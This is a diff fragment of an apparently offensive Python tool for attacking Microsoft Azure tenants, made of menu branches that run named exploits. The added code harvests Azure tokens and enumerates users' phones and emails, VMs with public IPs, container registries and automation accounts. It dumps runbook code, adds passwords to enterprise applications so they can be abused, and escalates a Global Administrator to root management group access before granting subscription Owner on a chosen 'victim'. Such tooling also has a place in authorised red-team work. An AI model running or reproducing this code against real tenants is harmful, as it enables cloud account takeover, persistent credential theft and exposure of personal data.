+                print("Trying getting token automatically for you...")
+                initToken(tryGetToken())
+            elif "Token/SetToken" in ExploitChoosen and mode == "run":
+                print("Please paste your Azure token here:")
+                token = input("Enter Token:")
+                initToken(token)
+                print("All set.")
+            elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
+                print("Trying to enumerate all external-facing Azure Service Apps..")
+                AppServiceRecords = PrettyTable()
+                AppServiceRecords.align = "l"
+                AppServiceRecords.field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)"]
+                AppServiceRecordsCount = 0
+                for AppServiceRecord in RD_ListExposedWebApps()['value']:
+                    AppServiceRecords.add_row([AppServiceRecordsCount, AppServiceRecord['name'], AppServiceRecord['kind'], AppServiceRecord['properties']['state'], ",".join(AppServiceRecord['properties']['enabledHostNames'])])
+                    AppServiceRecordsCount += 1
+                print(AppServiceRecords)
+            elif "Reader/ListAllAzureContainerRegistry" in ExploitChoosen and mode == "run":
+                print("Trying to list all ACR (Azure Container Registry) available in all subscriptions..")
+                ACRRecords = PrettyTable()
+                ACRRecords.align = "l"
+                ACRRecords.field_names = ["#", "Registry Name", "Location", "Login Server", "AdminEnabled", "CreatedAt"]
+                ACRRecordsCount = 0
+                for ACRRecord in RD_ListAllACRs()['value']:
+                    ACRRecords.add_row([ACRRecordsCount, ACRRecord['name'], ACRRecord['location'], ACRRecord['properties']['loginServer'], ACRRecord['properties']['adminUserEnabled'], ACRRecord['properties']['loginServer']])
+                    ACRRecordsCount += 1
+                print(ACRRecords)
+            elif "Reader/ListAutomationAccounts" in ExploitChoosen and mode == "run":
+                print("Trying to enumerate all automation accounts..")
+                AutomationAccountRecords = PrettyTable()
+                AutomationAccountRecords.align = "l"
+                AutomationAccountRecords.field_names = ["#", "SubscriptionId", "AccountName", "Location", "Tags"]
+                AutomationAccountRecordsCount = 0
+                for AutomationAccRecord in RD_ListAutomationAccounts():
+                    AutomationAccountRecords.add_row(
+                        [AutomationAccountRecordsCount, AutomationAccRecord['subscriptionId'], AutomationAccRecord['name'], AutomationAccRecord['location'],
+                         str(AutomationAccRecord['tags'])])
+                    AutomationAccountRecordsCount += 1
+                print(AutomationAccountRecords)
+            elif "Reader/DumpAllRunBooks" in ExploitChoosen and mode == "run":
+                print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
+                print("Keep in mind that it might be noisy opsec..")
+                ExportedRunBooksRecordsCount = 0
+                DestPath = input("Please enter the path for store the data locally [i.e. C:\\tmp]: ")
+                for CurrentRunBookRecord in RD_ListRunBooksByAutomationAccounts():
+                    with open(os.path.normpath(DestPath+'\\'+'runbook_'+str(CurrentRunBookRecord['name'])+'.txt'), 'x') as f:
+                        f.write(str(RD_DumpRunBookContent(CurrentRunBookRecord['id'])))
+                    ExportedRunBooksRecordsCount += 1
+                print("Done. Dumped Total " + str(ExportedRunBooksRecordsCount) + " runbooks to " + str(DestPath))
+            elif "Reader/ListAllRunBooks" in ExploitChoosen and mode == "run":
+                print("Trying to enumerate all runbooks under available automation accounts..")
+                RunBooksRecords = PrettyTable()
+                RunBooksRecords.align = "l"
+                RunBooksRecords.field_names = ["#", "SubscriptionId", "AutomationAccount", "Runbook Name", "Runbook Type", "Status", "CreatedAt", "UpdatedAt"]
+                RunBooksRecordsCount = 0
+                for RunBookRecord in RD_ListRunBooksByAutomationAccounts():
+                    RunBooksRecords.add_row([RunBooksRecordsCount, RunBookRecord['subscriptionId'], RunBookRecord['automationAccount'], RunBookRecord['name'], RunBookRecord['properties']['runbookType'], RunBookRecord['properties']['state'], RunBookRecord['properties']['creationTime'], RunBookRecord['properties']['lastModifiedTime']])
+                    RunBooksRecordsCount += 1
+                print(RunBooksRecords)
+            elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
+                print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
+                ArmTempRecords = PrettyTable()
+                ArmTempRecords.align = "l"
+                ArmTempRecords.field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
+                ArmTempRecordsCount = 0
+                print("Skipping SecureString/Object/Array values from list..")
+                for ArmTempRecord in RD_ListARMTemplates():
+                    for itStr in ArmTempRecord['params']:
+                        if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
+                            continue
+                        ArmTempRecords.add_row(
+                            [ArmTempRecordsCount, ArmTempRecord['name'], itStr, ArmTempRecord['params'][itStr]['type'],
+                             ArmTempRecord['params'][itStr]['value']])
+                    for itStrO in ArmTempRecord['outputs']:
+                        ArmTempRecords.add_row([ArmTempRecordsCount, ArmTempRecord['name'], itStrO, ArmTempRecord['outputs'][itStrO]['type'],ArmTempRecord['outputs'][itStrO]['value']])
+                    ArmTempRecordsCount += 1
+                print(ArmTempRecords)
+            elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
+                print("Trying to list all users.. (it might take a few minutes)")
+                AllUsersRecords = PrettyTable()
+                AllUsersRecords.align = "l"
+                AllUsersRecords.field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
+                AllUsersRecordsCount = 0
+                for UserRecord in RD_ListAllUsers()['value']:
+                    AllUsersRecords.add_row([AllUsersRecordsCount, UserRecord['displayName'], UserRecord['givenName'], UserRecord['surname'], UserRecord['mobilePhone'], UserRecord['mail'], UserRecord['userPrincipalName']])
+                    AllUsersRecordsCount += 1
+                print(AllUsersRecords)
+            elif "Reader/ListVirtualMachines" in ExploitChoosen and mode == "run":
+                print("Trying to list all virtual machines.. (it might take a few minutes)")
+                AllVMRecords = PrettyTable()
+                AllVMRecords.align = "l"
+                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
+                AllVMRecordsCount = 0
+                for UserVMRecord in RD_ListAllVMs():
+                    AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name']), UserVMRecord['resourceGroup'], UserVMRecord['identity']['type'], UserVMRecord['subscriptionId']])
+                    AllVMRecordsCount += 1
+                print(AllVMRecords)
+            elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
+                print("Trying to enumerate all service principles (App registrations)..")
+                EntAppsRecords = PrettyTable()
+                EntAppsRecords.align = "l"
+                EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
+                EntAppsRecordsCount = 0
+                for EntAppsRecord in RD_AddAppSecret()['value']:
+                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], CHK_AppRegOwner(EntAppsRecord['appId'])])
+                    EntAppsRecordsCount += 1
+                print(EntAppsRecords)
+            elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
+                print("Trying to enumerate all Enterprise applications (service principals)..")
+                EntAppsRecords = PrettyTable()
+                EntAppsRecords.align = "l"
+                EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
+                EntAppsRecordsCount = 0
+                for EntAppsRecord in RD_AddAppSecret()['value']:
+                    print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
+                    pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
+                    if pwdGen == "N/A":
+                        EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], "N/A"])
+                    else:
+                        EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'],
+                                                EntAppsRecord['publisherDomain'],pwdGen])
+                    EntAppsRecordsCount += 1
+                print(EntAppsRecords)
+            elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
+                print("Elevating access to the root management group..")
+                print(GA_ElevateAccess())
+                print("Listing Target Subscriptions..")
+                listSubs = ListSubscriptionsForToken()
+                if listSubs.get('value') == None:
+                    print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
+                else:
+                    subRecords = PrettyTable()
+                    subRecords.align = "l"
+                    subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                    subRecordCount = 0
+                    for subRecord in listSubs['value']:
+                        subRecords.add_row(
+                            [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
+                             subRecord['subscriptionPolicies']['quotaId'],
+                             subRecord['subscriptionPolicies']['spendingLimit']])
+                        subRecordCount += 1
+                    print(subRecords)
+                    TargetSubscriptionVictim = input("Choose Subscription >> ")
+                    print(GA_AssignSubscriptionOwnerRole(str(TargetSubscriptionVictim)))
+            else:
+                print("unkown command.")
 
 
+attackWindow()
+
+'''
 def statupWindow(isFromMenu):
     if isFromMenu:
         print("You're out of attack mode.")
         isFromMenu = False
     while (True):
+        attackWindow()
+
+       
         opt = input(">> ")
         if opt == "1":
             print("Trying getting token automaticlly for you...")
@@ -712,8 +973,10 @@ def statupWindow(isFromMenu):
             attackWindow()
         elif opt == "6":
             AboutWindow()
+        elif opt == "whoami":
+            currentProfile()
+        elif opt == "scopes":
+            currentScope()
         else:
             displayMenu(True)
-
-
-statupWindow(False)
+'''
